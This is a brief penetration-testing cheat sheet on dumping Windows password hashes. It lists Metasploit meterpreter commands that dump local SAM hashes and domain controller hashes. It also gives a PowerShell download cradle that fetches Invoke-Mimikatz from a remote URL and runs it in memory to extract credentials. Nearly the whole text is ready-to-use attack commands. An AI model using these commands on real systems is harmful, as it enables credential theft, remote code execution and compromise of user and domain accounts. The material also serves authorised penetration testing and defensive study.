# Passwords - Dumping Hashes

#### Windows

```meterpreter> run post/windows/gather/hashdump```

Dump the local user accounts from the SAM database using the registry

```powershell "IEX (New-Object Net.WebClient).DownloadString('http://<invoke-mimkatz>'); Invoke-Mimikatz -DumpCreds"```

Run Invoke-Mimikatz in memory with Powershell web cradle. You can add all arguments to the end of command

```meterpreter> use post/windows/gather/credentials/domain_hashdump```

Dump hashes from domain controller safely
